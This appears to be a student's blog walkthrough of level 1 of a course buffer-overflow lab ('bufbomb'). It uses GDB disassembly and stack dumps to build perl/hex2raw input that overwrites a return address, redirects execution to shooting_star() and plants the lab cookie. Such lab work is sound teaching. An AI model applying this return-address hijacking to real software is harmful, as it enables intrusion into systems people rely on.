---
title: 'Level 1. Shooting Star'
date: 2016-07-08
permalink: /posts/2016/07/bufflab-level-1/
tags:
  - computer organization and architecture
  - buffer lab
  - assembly
  - shooting star
---

Primary purpose:

We have to give an input such that after program calls function **ah_choo()** it won't return to procedure **test()**, yet calls procedure **shooting_star()** which has an argument containing our cookie (0x1d9ed824).

So this is the C code for procedure **shooting_star()**.

> void shooting_star (int val) {<br />
> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (val == cookie) {<br />
> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("OK: You called fizz(0x%x)\n", val);<br />
> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;validate(1);<br />
> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} else {<br />
> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("NO: You called fizz(0x%x)\n", val);<br />
> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br />
> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exit(0);<br />
> }<br />

Next we'll see what this procedure **shooting_star()** does by typing this command:

> gdb bufbomb<br />
> (gdb) disas shooting_star<br />

Will give this result:

**Dump of assembler code for function shooting_star:**

Address | Operation | Elements in operation
--- | --- | ---
0x08048b77 <+0>:  | sub   | $0x1c, %esp
0x08048b7a <+3>:  | mov   | 0x20(%esp), %edx
0x08048b7e <+7>:  | mov   | 0x28(%esp), %eax
0x08048b82 <+11>: |  cmp  |  0x804d10c, %eax
0x08048b88 <+17>: |  jne  |  0x8048bcf <shooting_star+88>
0x08048b8a <+19>: |  cmp  |  $0x59, %dl
0x08048b8d <+22>: |  jne  |  0x8048bb5 <shooting_star+62>
0x08048b8f <+24>: |  mov  |  %eax, 0x8(%esp)
0x08048b93 <+28>: |  movl |  $0x804a08c, 0x4(%esp)
0x08048b9b <+36>: |  movl |  $0x1, (%esp)
0x08048ba2 <+43>: |  call |  0x8048900 <__printf_chk@plt>
0x08048ba7 <+48>: |  movl |  $0x1, (%esp)
0x08048bae <+55>: |  call |  0x8049171 <validate>
0x08048bb3 <+60>: |  jmp  |  0x8048be7 <shooting_star+112>
0x08048bb5 <+62>: |  mov  |  %eax, 0x8(%esp)
0x08048bb9 <+66>: |  movl |  $0x804a0b4, 0x4(%esp)
0x08048bc1 <+74>: |  movl |  $0x1, (%esp)
0x08048bc8 <+81>: |  call |  0x8048900 <__printf_chk@plt>
0x08048bcd <+86>: |  jmp  |  0x8048be7 <shooting_star+112>
0x08048bcf <+88>: |  mov  |  %eax, 0x8(%esp)
0x08048bd3 <+92>: |  movl |  $0x804a0e4, 0x4(%esp)
0x08048bdb <+100>: |   movl | $0x1, (%esp)

**-Type < return > to continue, or q < return > to quit-**

We can see from the row **0x08048b7a <+3>** that register %edx is filled with the contents of stack which is located at %esp+0x20. Then, at row 0x08048b7e <+7> we can see that register %eax is filled with the contents of stack which is located at %esp+0x28. Then, what are the values contained within those 2 blocks of stack? We'll see them later.

Then we can see from row 0x08048b82 <+11> that the contents of register %eax is compared with the contents of block located at 0x804d10c. So, after register %eax is being filled with the stack's value located at %esp+0x28, its value is compared with the value of certain memory. The result of comparison must be same so that we can enter the next process. Then, what is the value contained at address 0x804d10c? To find it, we must run the program and break at procedure **shooting_star()**. We can break at that procedure by changing the return address of **ah_choo()** into 08048b77. Use this command:

> perl -e 'print "61 "x32, "62 "x20, "77 8b 04 08"' > hex0<br />
> ./hex2raw < hex0 > raw0<br />

And type this command:

> gdb bufbomb<br />
> (gdb) b shooting_star<br />
> Breakpoint 1 at 0x8048b77<br />
> (gdb) run -u eksperimen < raw0<br />
> Userid: eksperimen<br />
> Cookie: 0x1d9ed824<br />
> Masukkan input:<br />
> Breakpoint 1, 0x08048b77 in shooting_star ()<br />

Now we can see the contents of memory address 0x804d10c by typing this command:

> (gdb) x/ 0x804d10c<br />
> 0x804d10c < cookie >:    496949284<br />
> (gdb) p/x 496949284<br />
> $1 = 0x1d9ed824<br />

We can use command **p/x** to convert a number into hexadecimal representation.

Evidently, the contents of that memory address is our cookie! This means if we want to proceed to the next Assembly code, the value of register %eax must be same with our cookie (0x1d9ed824). 

The problem is, how to change the value of register %eax into our cookie?

Let's see this assembly code.

Address | Operation | Elements in operation
--- | --- | ---
0x08048b7a <+3>:  |  mov  |  0x20(%esp), %edx
0x08048b7e <+7>:  |  mov  |  0x28(%esp), %eax

If we want to know the contents of register %edx and %eax, we do need to see the contents of the stack. Use this command (still using GDB):

> (gdb) ni<br />
> (gdb) x/20x $esp<br />

The contents of stack | | | | |
--- | --- | --- | --- | ---
0x5568366c <_reserved+1037932>:  | 0x61616161  | 0x62626262  | 0x62626262  | 0x62626262
0x5568367c <_reserved+1037948>:  | 0x62626262  | 0x62626262  | 0x08048b77  | 0x00000000
0x5568368c <_reserved+1037964>:  | 0xf7fba000  | 0x0000000f  | 0x08048dcd  | 0xf7fbaac0
0x5568369c <_reserved+1037980>:  | 0x0000000a  | 0x0000000f  | 0xf7e12700  | 0x55685ff0

From the above stack, we can see that our string input, namely character 61 as much as 32 characters and character 62 as much as 20 characters fill the stack. Also the return address was changed into 0x08048b77 which is the address of **shooting_star()**. 

Register %edx is filled with the contents of stack located at %esp+0x20. Now, we see that the contents of stack located at %esp+0x20. The address of register %esp is 0x5568366c. Use this command:
  
> (gdb) x/ 0x5568366c+0x20<br />

The contents of stack | | | | |
--- | --- | --- | --- | ---
0x5568368c <_reserved+1037964>:  | 0xf7fba000  | | |
0x556836ac <_reserved+1037996>:  | 0xf7ff0500  |  0x55685680  |  0x5614541e  |  0x00000003

So the contents of stack located at %esp+0x20 is 0xf7fba000. This value is stored in register %edx.

Now we see the contents of stack located at %esp+0x28 which will be stored in register %eax. Use this command:

> (gdb) x/ 0x5568366c+0x28<br />
> 0x55683694 <_reserved+1037972>:    0x08048dcd<br />

So, the contents of stack located at %esp+0x28 is 0x08048dcd. This value is stored in register %eax. 

Ok, now we have already known the position of address whose value will be stored in register %edx and %eax. Things that should be done now is we will give an additional string input so that the contents at the corresponding stack address can be changed according to specification. The specification for register %eax is its value should be changed into our cookie. Then, how about register %edx which will also be compared with $0x59? Let see the code snippet for **shooting_star()**:

Address | Operation | Elements in operation
--- | --- | ---
0x08048b8a <+19>:  |  cmp  |  $0x59, %dl
0x08048b8d <+22>:  |  jne  |  0x8048bb5 <shooting_star+62>

Wow, we can see that we won't compare the value of register %edx entirely with $0x59, yet only partition of register %edx which is called as %dl. Then, what is %dl? Take a look at this illustration. 

<img src="https://github.com/albertusk95/albertusk95.github.io/blob/master/images/posts/computerorg/shootstar00.jpg?raw=true" alt="Register" />

The above illustration explains that the base register such as eax, ebx, ecx, and edx has 2 parts, namely the first part is 16 bit towards MSB (Most Significant Bit) which is marked by white block, and the second part is 16 bit towards LSB (Least Significant Bit) which is marked by grey block. For register eax, the second part is reffered to ax, where ax itself is divided into 2 small parts, namely ah and al which each of them holds 8 bit. From the illustration we can see that al is part of register %eax which contains the right most 8 bit (towards LSB). 

In our case that concerns in dl, it means we're looking for register edx and dl itself refers to the right most contents of register %edx (8 bit). 

So, as we've already known the contents of register %edx (0xf7fba000), we can conclude that the right most 8 bit is the right most two digits of hexadecimal representation, namely 00. That two digits must be changed into 59. So, the final value of register %edx should be 0xf7fba059.  

Ok, let's start the exploit!

Let's quit from GDB by typing command **q** and type this command:

> perl -e 'print "61 "x32, "62 "x20, "77 8b 04 08 ", "63 "x4, "59 "x1, "64 "x3, "65 "x4, "24 d8 9e 1d"' > hex0<br />
> ./hex2raw < hex0 > raw0<br />

Then let's go back into GDB with these commands:

> gdb bufbomb<br />
> (gdb) b shooting_star<br />
> Breakpoint 1 at 0x8048b77<br />
> (gdb) run -u eksperimen < raw0<br />
> Userid: eksperimen<br />
> Cookie: 0x1d9ed824<br />
> Masukkan input:<br />
> Breakpoint 1, 0x08048b77 in shooting_star ()<br />
> (gdb) ni<br />
> (gdb) ni<br />
> (gdb) ni<br />
> (gdb) ni<br />
> (gdb) i r<br />

Info registers | | |
--- | --- | ---
eax      |     0x1d9ed824  |  496949284
ecx      |     0xf7fbb8a4  |  -134498140
edx      |     0x64646459  |  1684300889
ebx      |     0x0  |  0
esp      |     0x5568366c  |  0x5568366c <_reserved+1037932>
ebp      |     0x55685ff0  |  0x55685ff0 <_reserved+1048560>
esi      |     0x3  |  3
edi      |     0x0  |  0
eip      |     0x8048b88   |  0x8048b88 <shooting_star+17>
eflags   |     0x246  |  [ PF ZF IF ]
cs       |     0x23   |   35
ss       |     0x2b   |   43
ds       |     0x2b   |   43
es       |     0x2b   |   43
fs       |     0x0    |   0
gs       |     0x63   |   99

Great! As we can see, after we execute the command for filling the register %edx and %eax, the contents of register %eax is our cookie and the **dl** value of register %edx is 59. Now let's see the stack's condition. Use this command:

> (gdb) x/20x $esp<br />

The contents of stack | | | | |
--- | --- | --- | --- | ---
0x5568366c <_reserved+1037932>:  |  0x61616161  |  0x62626262  |  0x62626262  |  0x62626262
0x5568367c <_reserved+1037948>:  |  0x62626262  |  0x62626262  |  0x08048b77  |  0x63636363
0x5568368c <_reserved+1037964>:  |  0x64646459  |  0x65656565  |  0x1d9ed824  |  0xf7fbaa00
0x5568369c <_reserved+1037980>:  |  0x0000000a  |  0x0000000f  |  0xf7e12700  |  0x55685ff0
0x556836ac <_reserved+1037996>:  |  0xf7ff0500  |  0x55685680  |  0x7ffa3ea0  |  0x00000003

From above stack's illustration, we can see that the current stack's condition is suitable with the given input. For the rest, use this command:

> (gdb) c<br />
> Continuing.<br />
> OK: The shooting_star(0x1d9ed824) over there<br />
> VALID<br />
> Selamat!<br />
> [Inferior 1 (process 4639) exited normally]<br />

Yeah! Great works!

Continue to level 2!
